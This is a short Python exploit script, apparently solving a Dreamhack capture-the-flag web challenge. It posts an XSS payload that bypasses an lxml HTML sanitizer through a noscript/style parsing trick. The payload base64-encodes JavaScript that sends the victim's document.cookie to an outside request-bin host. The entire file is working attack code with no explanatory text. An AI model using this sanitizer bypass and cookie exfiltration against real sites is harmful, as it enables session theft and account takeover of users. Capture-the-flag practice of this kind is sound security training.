import base64

import requests

url = 'http://host3.dreamhack.games:20773'

request_bin = 'https://vmaqiqk.request.dreamhack.games'
payload = base64.b64encode(f'javascript:fetch("{request_bin}/".concat(document.cookie))'.encode()).decode()

# https://github.com/lxml/lxml/commit/89e7aad6e7ff9ecd88678ff25f885988b184b26e
param = f'<noscript><style><a title="</noscript><img src=x onerror=location=atob`{payload}`>'

requests.post(f'{url}/flag', data={'param': param})
